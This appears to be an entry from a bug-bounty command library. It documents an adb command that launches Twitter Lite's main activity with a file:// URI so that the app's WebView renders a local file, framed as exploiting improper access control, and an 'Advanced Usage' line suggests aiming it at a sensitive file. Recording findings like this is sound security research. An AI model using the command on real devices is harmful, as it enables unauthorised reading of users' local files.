---
data: >-
  adb shell am start -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "file:///sdcard/BugBounty/1.html"
tags:
  - adb
  - intent
  - file-access
type: command
output: App loads and displays the content of the local HTML file
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.833Z'
id: db3a8e68-c2c7-46a8-9d9d-f5e1299bd372
verified: false
validated: true
submitted: true
---
# adb-start-twitterlite-with-file-uri

## Command

```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"
```

## Description

Starts the TwitterLiteActivity using ADB with a file:// URI to load local file content, exploiting improper access control.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Specifies package and activity name | Yes |
| -d | Data URI for the intent (file path) | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"
```

### Advanced Usage

Change path to target sensitive file: -d "file:///sdcard/config.txt"

## Expected Output

Twitter Lite app launches and WebView renders the local file's content.

## Related

- [[commands/adb-start-twitterlite-with-javascript-alert]]
- [[procedures/Launch-TwitterLiteActivity-with-File-URI-for-Local-File-Access]]
